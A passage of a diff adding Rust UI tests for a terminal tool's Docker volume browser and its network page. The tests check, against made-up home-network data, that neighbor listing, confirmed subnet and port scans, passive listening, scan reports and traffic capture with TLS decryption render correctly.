+    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Right)).send(key(KeyCode::Up));
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "~2026-01-10")?;
+    check("docker_disk_volumes", &stage, buffer)?;
+
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Enter Files")?;
+    check("docker_disk_volume_details", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
+    for effect in effects {
+        let Effect::List { side, generation, dir } = effect else { continue };
+        assert_eq!(dir, share, "Enter shows the volume's files where OrbStack shares them");
+        let entries = vec![
+            entry("2025", EntryKind::Dir, 4096, OLD, false),
+            entry("2026", EntryKind::Dir, 4096, RECENT, false),
+            entry("index.json", EntryKind::File, 18_412, RECENT, false),
+        ];
+        stage.send(Msg::Batch { side, generation, entries });
+        stage.send(Msg::Listed { side, generation, error: None });
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "blog_uploads · read only")?;
+    check("docker_volume_panel", &stage, buffer)
+}
+
+/// Disk use on an engine whose volume files Borg cannot read here: the details say a helper
+/// container shows them, Enter asks before downloading its image, and the panel then shows the
+/// volume from the helper, read only.
+#[test]
+fn docker_volumes_borg_cannot_read_open_through_a_helper_after_asking() -> Result<()> {
+    use borg_core::{DockerData, DockerRequest, Effect};
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)));
+    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
+        panic!("opening lists containers")
+    };
+    stage.send(Msg::Docker { id, result: Ok(DockerData::Listed { context: None, containers: Vec::new() }) });
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Char('d')), stage.started);
+    let id = effects
+        .iter()
+        .find_map(|e| match e {
+            Effect::Docker { id, request: DockerRequest::DiskUse } => Some(*id),
+            _ => None,
+        })
+        .context("D measures disk use")?;
+    let measured =
+        DockerData::DiskUse { usage: Box::new(disk_use()), context: None, contexts: None, folders: Default::default() };
+    stage.send(Msg::Docker { id, result: Ok(measured) });
+    for _ in 0..6 {
+        stage.send(key(KeyCode::Down));
+    }
+    stage.send(key(KeyCode::Right)).send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "To open it without a helper")?;
+    check("docker_disk_volume_helper", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Enter));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Download the busybox image")?;
+    check("docker_volume_helper_confirm", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
+    let id = effects
+        .iter()
+        .find_map(|e| match e {
+            Effect::Docker { id, request: DockerRequest::OpenVolume { pull: true, .. } } => Some(*id),
+            _ => None,
+        })
+        .context("Yes downloads the image and starts the helper")?;
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Docker { id, result: Ok(DockerData::Helper("e1a9c0ffee".into())) },
+        stage.started,
+    );
+    for effect in effects {
+        let Effect::List { side, generation, dir } = effect else { continue };
+        assert_eq!(dir, PathBuf::from(borg_docker::helper::ROOT), "the panel starts at the volume's top");
+        let entries = vec![
+            entry("2025", EntryKind::Dir, 4096, OLD, false),
+            entry("index.json", EntryKind::File, 18_412, RECENT, false),
+        ];
+        stage.send(Msg::Batch { side, generation, entries });
+        stage.send(Msg::Listed { side, generation, error: None });
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "blog_uploads · read only")?;
+    check("docker_volume_helper_panel", &stage, buffer)
 }
 
 /// The network screen over a made-up machine after half a minute of samples: the ports and
@@ -3059,9 +4721,507 @@ fn network_lists_ports_processes_connections_and_interfaces() -> Result<()> {
     Ok(())
 }
 
+/// The Neighbors page over a made-up home network: the gateway first, vendors where no name
+/// resolves, a private address, a storage box on two addresses, a device that does not answer,
+/// every column once the pane is maximized, the gateway answering with another MAC, the menu of
+/// a row and the question before a scan.
+#[test]
+fn network_lists_the_neighbors_with_their_vendors_and_flags() -> Result<()> {
+    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('5')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "5 Neighbors")?;
+    ensure_text(&buffer, "router.home.arpa")?;
+    ensure_text(&buffer, "Gateway 192.0.2.1 · DNS 192.0.2.1, 198.51.100.53")?;
+    ensure_no_text(&buffer, "192.0.2.255")?;
+    ensure_text(&buffer, "en0 · Wi-Fi · 192.0.2.20/24")?;
+    ensure_text(&buffer, "› Internet · via 192.0.2.1 · in use")?;
+    ensure_text(&buffer, "utun3 · Tunnel · 198.51.100.2")?;
+    ensure_text(&buffer, "› 10.20.0.0/16")?;
+    check("network_neighbors", &stage, buffer)?;
+
+    for _ in 0..5 {
+        stage.send(key(KeyCode::Down));
+    }
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Other IPv4 addresses on en0 answer with this MAC address.")?;
+    check("network_neighbor_shared_mac", &stage, buffer)?;
+
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Vendor")?;
+    ensure_text(&buffer, "MAC shared")?;
+    check("network_neighbors_wide", &stage, buffer)?;
+    stage
+        .send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)))
+        .send(key(KeyCode::Home))
+        .send(key(KeyCode::Down));
+
+    let id = stage.state.network.pending.context("the screen waits for a sample")?;
+    let mut sample = borg_testkit::network::sample(borg_testkit::network::SECONDS);
+    let neighborhood = sample.neighborhood.as_mut().context("the sample reads the neighbors")?;
+    for neighbor in neighborhood.neighbors.iter_mut().filter(|neighbor| neighbor.address.to_string() == "192.0.2.1") {
+        neighbor.mac = borg_core::Mac::parse("00:16:3e:44:55:66");
+    }
+    stage.send(Msg::Network { id, result: Ok(sample) });
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Gateway MAC changed: 00:27:22:4c:01:01 → 00:16:3e:44:55:66")?;
+    ensure_text(&buffer, "This gateway answered with 00:27:22:4c:01:01")?;
+    check("network_neighbor_gateway_changed", &stage, buffer)?;
+
+    let right =
+        MouseEvent { kind: MouseEventKind::Down(MouseButton::Right), column: 8, row: 5, modifiers: KeyModifiers::NONE };
+    let msg = borg_ui::mouse_input(&stage.state, right, false, now).context("a right-click on a row")?;
+    stage.send(msg);
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Copy IP address")?;
+    ensure_text(&buffer, "Copy MAC address")?;
+    check("network_neighbor_menu", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+
+    stage.send(key(KeyCode::Char('s')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "192.0.2.0/24")?;
+    ensure_text(&buffer, "253 addresses on en0.")?;
+    check("network_scan_question", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+    anyhow::ensure!(stage.state.overlay.is_none(), "Esc leaves without scanning");
+    Ok(())
+}
+
+/// S scans the subnet once asked: hosts that answer join the list with their open ports and
+/// ping time while the footer counts, and Esc offers to stop. Hosts Borg remembers that are
+/// gone show dimmed with the time they were last seen, their details keep the ports an earlier
+/// scan found, and their menu and F8 forget them after asking.
+#[test]
+fn network_scans_the_subnet_and_shows_remembered_hosts_that_are_gone() -> Result<()> {
+    use borg_core::{Effect, Probe};
+    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+    use std::time::Duration;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    stage.state.network.memory = borg_testkit::network::remembered();
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('5')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Offline")?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    for _ in 0..9 {
+        stage.send(key(KeyCode::Down));
+    }
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Seen Jan 14 18:30")?;
+    ensure_text(&buffer, "› 203.0.113.0/24 · on gateway 192.0.2.1 · 1 hop · 1 host")?;
+    ensure_text(&buffer, "via 192.0.2.1")?;
+    ensure_text(&buffer, "Seen Jan  2 09:05")?;
+    check("network_neighbors_offline", &stage, buffer)?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Last seen")?;
+    check("network_neighbor_offline_details", &stage, buffer)?;
+
+    let right = MouseEvent {
+        kind: MouseEventKind::Down(MouseButton::Right),
+        column: 8,
+        row: 13,
+        modifiers: KeyModifiers::NONE,
+    };
+    let msg = borg_ui::mouse_input(&stage.state, right, false, now).context("a right-click on the offline row")?;
+    stage.send(msg);
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Forget host")?;
+    check("network_neighbor_offline_menu", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc)).send(key(KeyCode::F(8)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Forget 192.0.2.70?")?;
+    check("network_forget_question", &stage, buffer)?;
+    stage.send(key(KeyCode::Char('y')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Forgot 192.0.2.70.")?;
+    ensure_no_text(&buffer, "Philips Lighting")?;
+
+    stage.send(key(KeyCode::Home)).send(key(KeyCode::Char('s')));
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let Some(Effect::ScanSubnet { id, addresses, .. }) = effects.into_iter().next() else { panic!("Enter scans") };
+    let probe = |address: &str, ping: Option<u64>, open: &[u16], refused: bool| Msg::Probed {
+        id,
+        probe: Probe {
+            address: address.parse().unwrap(),
+            ping: ping.map(Duration::from_micros),
+            open: open.to_vec(),
+            refused,
+            trace: None,
+        },
+        at: borg_testkit::network::NEIGHBORS_READ_AT,
+    };
+    stage
+        .send(probe("192.0.2.1", Some(1_400), &[80, 443], false))
+        .send(probe("192.0.2.2", None, &[], false))
+        .send(probe("192.0.2.31", Some(5_200), &[80, 443], false))
+        .send(probe("192.0.2.77", None, &[], true))
+        .send(probe("192.0.2.93", Some(2_100), &[22], false));
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, &format!("Scanning 192.0.2.0/24: 5 of {}, 4 answered", addresses.len()))?;
+    ensure_text(&buffer, "Esc Stop scan")?;
+    ensure_text(&buffer, "192.0.2.93")?;
+    check("network_scan_running", &stage, buffer)?;
+    Ok(())
+}
+
+/// Puts the cursor on the Neighbors page's row that names `wanted`: a host's address, an
+/// interface, a routed network or "Internet".
+fn select_row(stage: &mut Stage, wanted: &str) -> Result<()> {
+    use borg_core::NeighborEntry;
+    stage.send(key(KeyCode::Home));
+    for _ in 0..stage.state.network.neighbors.len() {
+        let network = &stage.state.network;
+        let named = match network.entry() {
+            Some(NeighborEntry::Interface(at)) => network.sample.interfaces[at].name.clone(),
+            Some(NeighborEntry::Network(at)) => network.routed[at].cidr(),
+            Some(NeighborEntry::Internet(_)) => "Internet".to_owned(),
+            Some(NeighborEntry::Host(row)) => network.neighborhood.neighbors[row.neighbor].address.to_string(),
+            None => String::new(),
+        };
+        if named == wanted {
+            return Ok(());
+        }
+        stage.send(key(KeyCode::Down));
+    }
+    anyhow::bail!("a row names {wanted}")
+}
+
+/// D asks before looking for networks behind the gateway, the footer counts what it finds, and
+/// the map shows each one under the interface that reaches it, with the routers on the way. A
+/// routed network, the way to the internet and a tunnel's network each have their own details,
+/// S on a routed network scans it through the router, and a typed network beyond every known one
+/// asks first with No as the default.
+#[test]
+fn network_discovers_the_networks_behind_the_gateway_and_maps_them() -> Result<()> {
+    use borg_core::{Effect, Probe, Trace};
+    use std::time::Duration;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    stage.state.network.memory = borg_testkit::network::remembered();
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('5'))).send(key(KeyCode::Char('d')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Look for networks through 192.0.2.1 on en0?")?;
+    check("network_discover_question", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let Some(Effect::Discover { id, addresses }) = effects.into_iter().next() else { panic!("Enter discovers") };
+    let probe = |address: &str, hops: Option<u8>, path: &[&str]| Msg::Probed {
+        id,
+        probe: Probe {
+            address: address.parse().unwrap(),
+            ping: hops.map(|hops| Duration::from_micros(900 * u64::from(hops))),
+            open: Vec::new(),
+            refused: false,
+            trace: hops.map(|hops| Trace {
+                hops: Some(hops),
+                path: path.iter().map(|router| router.parse().unwrap()).collect(),
+            }),
+        },
+        at: borg_testkit::network::NEIGHBORS_READ_AT,
+    };
+    stage
+        .send(probe("10.0.0.1", None, &[]))
+        .send(probe("172.16.0.1", Some(3), &["192.0.2.1", "198.51.100.1"]))
+        .send(probe("192.168.1.1", Some(1), &[]));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, &format!("Looking through 192.0.2.1 on en0: 3 of {}, 2 found", addresses.len()))?;
+    ensure_text(&buffer, "› 172.16.0.0/24 · via 192.0.2.1 › 198.51.100.1 · 3 hops · 1 host")?;
+    ensure_text(&buffer, "› 192.168.1.0/24 · on gateway 192.0.2.1 · 1 hop · 1 host")?;
+    check("network_discover_running", &stage, buffer)?;
+    stage.send(Msg::ScanFinished { id, result: Ok(()) });
+
+    select_row(&mut stage, "172.16.0.0/24")?;
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Looked through 192.0.2.1 on en0: 2 networks found.")?;
+    ensure_text(&buffer, "192.0.2.1 › 198.51.100.1 · en0")?;
+    check("network_routed_details", &stage, buffer)?;
+
+    select_row(&mut stage, "203.0.113.0/24")?;
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "The gateway answered for this network itself")?;
+    check("network_remembered_network_details", &stage, buffer)?;
+
+    select_row(&mut stage, "Internet")?;
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Internet traffic leaves this way now.")?;
+    check("network_internet_details", &stage, buffer)?;
+
+    select_row(&mut stage, "10.20.0.0/16")?;
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Traffic to this network goes into the tunnel on utun3.")?;
+    check("network_tunnel_network_details", &stage, buffer)?;
+
+    select_row(&mut stage, "172.16.0.0/24")?;
+    stage.send(key(KeyCode::Char('s')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "254 addresses reached through en0.")?;
+    check("network_scan_routed_form", &stage, buffer)?;
+    for _ in 0.."172.16.0.0/24".len() {
+        stage.send(key(KeyCode::Backspace));
+    }
+    stage.send(Msg::Paste("198.18.0.0/28".into())).send(key(KeyCode::Enter));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "lies outside the private ranges")?;
+    check("network_scan_outside", &stage, buffer)?;
+    stage.send(key(KeyCode::Enter));
+    anyhow::ensure!(stage.state.network.scan.is_none(), "Enter keeps No");
+    Ok(())
+}
+
+fn select_neighbor(stage: &mut Stage, address: std::net::IpAddr) -> Result<()> {
+    stage.send(key(KeyCode::Home));
+    for _ in 0..stage.state.network.neighbors.len() {
+        if stage.state.network.neighbor().map(|(neighbor, _)| neighbor.address) == Some(address) {
+            return Ok(());
+        }
+        stage.send(key(KeyCode::Down));
+    }
+    anyhow::bail!("{address} is in the list")
+}
+
+/// P on the storage box asks which ports to scan and names a list that does not read; an address
+/// outside the private ranges gets a warning with No as the default. Yes starts a job the job
+/// list shows once the screen is closed, the finished scan says the host seemed to limit it,
+/// Enter lists the open ports with their names, and the host's details keep them.
+#[test]
+fn network_scans_a_hosts_ports_in_the_background_and_reports_when_done() -> Result<()> {
+    use borg_core::{Effect, Ending, PortAnswer, PortScanEvent, Tally};
+    use std::time::Duration;
+    const QUIET: Duration = Duration::from_secs(2);
+    const ANSWERED: usize = 500;
+    let storage_box: std::net::IpAddr = "192.0.2.60".parse()?;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('5')));
+    select_neighbor(&mut stage, storage_box)?;
+
+    stage.send(key(KeyCode::Char('p'))).send(key(KeyCode::Right)).send(key(KeyCode::Right));
+    stage.send(key(KeyCode::Down)).send(Msg::Paste("22,80,90-80".into())).send(key(KeyCode::Enter));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "90-80 ends before it starts.")?;
+    ensure_text(&buffer, "Up to 64 connections at once")?;
+    check("network_port_scan_form", &stage, buffer)?;
+
+    stage.send(ctrl('u')).send(Msg::Paste("22,80,443,8000-8100".into()));
+    stage.send(key(KeyCode::Up)).send(key(KeyCode::Up)).send(ctrl('u'));
+    for msg in chars("203.0.113.9") {
+        stage.send(msg);
+    }
+    stage.send(key(KeyCode::Enter));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Scan 104 ports on 203.0.113.9 in Fast mode?")?;
+    ensure_text(&buffer, "outside the private ranges")?;
+    check("network_port_scan_outside", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+    anyhow::ensure!(stage.state.overlay.is_none(), "Esc leaves without scanning");
+
+    stage.send(key(KeyCode::Char('p'))).send(key(KeyCode::Enter));
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let (id, request) = effects
+        .into_iter()
+        .find_map(|effect| match effect {
+            Effect::ScanPorts { id, request } => Some((id, request)),
+            _ => None,
+        })
+        .context("Yes starts the scan")?;
+    stage.send(key(KeyCode::Esc));
+    anyhow::ensure!(!stage.state.network.is_open(), "the screen closes while the scan runs on");
+    let open: Vec<u16> =
+        [22, 80, 139, 443, 445, 548, 631, 873].into_iter().filter(|port| request.ports.contains(port)).collect();
+    stage.send(Msg::PortScan { id, event: PortScanEvent::Progress { done: 180, open: open[..3].to_vec() } });
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::ALT))).send(key(KeyCode::Char(' ')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Scanning ports")?;
+    ensure_text(&buffer, "192.0.2.60")?;
+    ensure_text(&buffer, "180 of 720 ports")?;
+    ensure_text(&buffer, "[ P Pause ]")?;
+    check("network_port_scan_job", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('5')));
+    select_neighbor(&mut stage, storage_box)?;
+    let mut tally = Tally::new(request.ports.clone());
+    for (index, port) in request.ports.iter().enumerate().take(ANSWERED) {
+        tally.record(index, if open.contains(port) { PortAnswer::Open } else { PortAnswer::Closed });
+    }
+    let result = tally.result(Ending::RateLimited { port: 22 });
+    let at = borg_testkit::network::NEIGHBORS_READ_AT;
+    stage.send(Msg::PortScan { id, event: PortScanEvent::Finished { result, at } });
+    let rested = stage.state.idle_since + QUIET;
+    borg_core::update(&mut stage.state, Msg::Tick, rested);
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Port scan finished")?;
+    ensure_text(&buffer, "Slow mode may get through.")?;
+    check("network_port_scan_done", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Enter));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Open ports on 192.0.2.60")?;
+    ensure_text(&buffer, "22     ssh")?;
+    check("network_port_scan_result", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Port scan")?;
+    ensure_text(&buffer, "445    microsoft-ds")?;
+    check("network_neighbor_port_scan", &stage, buffer)
+}
+
+/// What a minute of listening on the made-up home network hears: the printer and a speaker over
+/// mDNS, a tablet over DHCP, a media computer over NetBIOS, and the switch port en0 is plugged
+/// into over LLDP.
+fn heard_at_home() -> Vec<borg_core::Heard> {
+    use borg_core::{Announcement, Heard, ListenProtocol, SwitchPort};
+    let at = |protocol, address: &str| Announcement { address: address.parse().ok(), ..Announcement::new(protocol) };
+    vec![
+        Heard::Host(Announcement {
+            name: Some("laserbox.local".into()),
+            model: Some("LaserBox 3000".into()),
+            services: vec!["ipp".into(), "http".into()],
+            ..at(ListenProtocol::Mdns, "192.0.2.31")
+        }),
+        Heard::Host(Announcement { kinds: vec!["Printer".into()], ..at(ListenProtocol::Ssdp, "192.0.2.31") }),
+        Heard::Host(Announcement {
+            mac: borg_core::Mac::parse("02:00:5e:10:00:90"),
+            name: Some("speaker.local".into()),
+            model: Some("Living Room Speaker".into()),
+            services: vec!["airplay".into(), "raop".into()],
+            ..at(ListenProtocol::Mdns, "192.0.2.90")
+        }),
+        Heard::Host(Announcement {
+            mac: borg_core::Mac::parse("02:00:5e:10:00:95"),
+            name: Some("tablet".into()),
+            client: Some("android-dhcp-14".into()),
+            ..at(ListenProtocol::Dhcp, "192.0.2.95")
+        }),
+        Heard::Host(Announcement { name: Some("MEDIA-PC".into()), ..at(ListenProtocol::Netbios, "192.0.2.52") }),
+        Heard::Switch(SwitchPort {
+            protocol: ListenProtocol::Lldp,
+            name: Some("core-sw".into()),
+            port: Some("ge-0/0/7".into()),
+            model: None,
+            address: None,
+        }),
+    ]
+}
+
+/// H on the Neighbors page asks where to listen, for how long and as whom. Listening runs as a
+/// job: the hosts it hears join the map with the names they announced, the switch port shows on
+/// the interface's heading, a heard host's details list what it announced, and the jobs panel
+/// counts the time and names the hosts heard last.
+#[test]
+fn network_listens_for_neighbors_and_maps_what_it_hears() -> Result<()> {
+    use borg_core::{CaptureAccess, Effect, ListenEvent};
+    let speaker: std::net::IpAddr = "192.0.2.90".parse()?;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.state.network.access = CaptureAccess { administrator: false, elevate: true, tags: true };
+    stage.send(key(KeyCode::Char('5'))).send(key(KeyCode::Char('h')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Listen for neighbors")?;
+    ensure_text(&buffer, "‹ en0 ›")?;
+    ensure_text(&buffer, "1 min")?;
+    ensure_text(&buffer, "Borg sends nothing while it listens.")?;
+    check("network_listen_form", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let id = effects
+        .into_iter()
+        .find_map(|effect| match effect {
+            Effect::Listen { id, .. } => Some(id),
+            _ => None,
+        })
+        .context("Enter starts listening")?;
+    borg_core::update(&mut stage.state, Msg::Listen { id, event: ListenEvent::Started }, now);
+    let later = now + Duration::from_secs(20);
+    let at = borg_testkit::network::NEIGHBORS_READ_AT;
+    borg_core::update(
+        &mut stage.state,
+        Msg::Listen { id, event: ListenEvent::Heard { heard: heard_at_home(), at } },
+        later,
+    );
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "en0 · Wi-Fi · 192.0.2.20/24 · core-sw · ge-0/0/7")?;
+    ensure_text(&buffer, "laserbox.local")?;
+    ensure_text(&buffer, "speaker.local")?;
+    ensure_text(&buffer, "H Stop listening")?;
+    check("network_neighbors_heard", &stage, buffer)?;
+
+    select_neighbor(&mut stage, speaker)?;
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "Living Room Speaker")?;
+    ensure_text(&buffer, "airplay, raop")?;
+    check("network_neighbor_heard_details", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc));
+    anyhow::ensure!(!stage.state.network.is_open(), "listening goes on with the screen closed");
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::ALT))).send(key(KeyCode::Char(' ')));
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "Listening")?;
+    ensure_text(&buffer, "20 of 60 seconds")?;
+    ensure_text(&buffer, "192.0.2.90 speaker.local · mDNS")?;
+    check("network_listen_job", &stage, buffer)
+}
+
+/// O on a host scanned twice shows its newest scan with ← to the earlier one, Ctrl-S there asks
+/// where to save that scan and in which format, and Ctrl-S on the Neighbors page does the same for
+/// every host.
+#[test]
+fn network_saves_a_scan_or_the_neighbors_page_as_a_report() -> Result<()> {
+    use borg_core::{Effect, Ending, PortScanEvent, PortScanResult};
+    let storage_box: std::net::IpAddr = "192.0.2.60".parse()?;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('5')));
+    select_neighbor(&mut stage, storage_box)?;
+    for (open, closed) in [(vec![22], 719), (vec![22, 80, 445], 717)] {
+        stage.send(key(KeyCode::Char('p'))).send(key(KeyCode::Enter));
+        let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+        let id = effects
+            .into_iter()
+            .find_map(|effect| match effect {
+                Effect::ScanPorts { id, .. } => Some(id),
+                _ => None,
+            })
+            .context("Yes starts the scan")?;
+        let result = PortScanResult { open, closed, filtered: 0, not_scanned: Vec::new(), ending: Ending::Done };
+        let at = borg_testkit::network::NEIGHBORS_READ_AT;
+        stage.send(Msg::PortScan { id, event: PortScanEvent::Finished { result, at } });
+    }
+
+    stage.send(key(KeyCode::Char('o')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Scan 1 of 2, newest first.")?;
+    ensure_text(&buffer, "Other scans")?;
+    check("network_port_scan_history", &stage, buffer)?;
+
+    stage.send(ctrl('s'));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Save report")?;
+    ensure_text(&buffer, "projects/borg/port-scan-192.0.2.60-2026-01-15.md")?;
+    ensure_text(&buffer, "Text with tables")?;
+    check("network_port_scan_save", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
+    anyhow::ensure!(stage.state.overlay.is_none(), "Esc goes back to the scan, then closes it");
+    stage.send(ctrl('s')).send(key(KeyCode::Tab)).send(key(KeyCode::Left));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "neighbors-")?;
+    ensure_text(&buffer, "One row per host")?;
+    check("network_neighbors_save", &stage, buffer)
+}
+
 /// R on the browser's row asks what to capture; the capture opens in the traffic viewer on
-/// the browser, where Enter goes from the process to its connections and on to one
-/// connection's packets, and Esc comes back the same way to every process and the hosts.
+/// the browser, where Enter goes from the process to its connections, whose bytes ] steps
+/// through by turn and F3 shows as hex rows, and on to one connection's packets, and Esc comes
+/// back the same way to every process and the hosts.
 #[test]
 fn network_captures_traffic_and_shows_it_by_process_host_connection_and_packet() -> Result<()> {
     use borg_core::{Capture, Effect, TrafficPage};
@@ -3075,7 +5235,7 @@ fn network_captures_traffic_and_shows_it_by_process_host_connection_and_packet()
     let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
     let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
     assert_eq!((request.interface.as_str(), request.filter.as_str()), ("en0", ""), "all of the busiest interface");
-    stage.send(Msg::CaptureProgress { id, bytes: 52_400, packets: 61 });
+    stage.send(Msg::CaptureProgress { id, progress: CaptureProgress { bytes: 52_400, packets: 61, room: None } });
     let buffer = stage.render(now)?;
     ensure_text(&buffer, "Capturing on en0 · 61 packets")?;
     ensure_text(&buffer, "R Stop capture")?;
@@ -3090,10 +5250,29 @@ fn network_captures_traffic_and_shows_it_by_process_host_connection_and_packet()
 
     stage.send(key(KeyCode::Enter));
     let buffer = stage.render(now)?;
-    ensure_text(&buffer, "ClientHello cdn.example.net")?;
+    ensure_text(&buffer, "Stream · ")?;
+    ensure_text(&buffer, "→ Sent ")?;
     check("traffic_connections", &stage, buffer)?;
 
-    stage.send(key(KeyCode::Enter)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char(']')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "← Received ")?;
+    ensure_text(&buffer, "[ ] Turn")?;
+    check("traffic_stream_turn", &stage, buffer)?;
+
+    stage.send(key(KeyCode::F(3)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "h text")?;
+    check("traffic_stream_viewer", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+    assert!(stage.state.viewer.is_none(), "Esc goes back to the stream");
+
+    stage
+        .send(key(KeyCode::Tab))
+        .send(key(KeyCode::Enter))
+        .send(key(KeyCode::Down))
+        .send(key(KeyCode::Down))
+        .send(key(KeyCode::Down));
     stage.send(key(KeyCode::Tab));
     let buffer = stage.render(now)?;
     ensure_text(&buffer, "ClientHello · cdn.example.net")?;
@@ -3110,6 +5289,26 @@ fn network_captures_traffic_and_shows_it_by_process_host_connection_and_packet()
     stage.send(key(KeyCode::Esc));
     assert!(stage.state.network.viewer.is_none() && stage.state.network.is_open(), "Esc goes back to the live screen");
     Ok(())
+}
+
+/// A capture that holds the TLS keys of its connections opens decrypted: the connection's
+/// stream shows the request and the answer the records carried, and marks the record no key
+/// opens.
+#[test]
+fn traffic_shows_a_tls_connection_decrypted_with_its_keys() -> Result<()> {
+    use borg_core::Capture;
+    let mut stage = stage(GridSize { cols: 132, rows: 58 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    let capture =
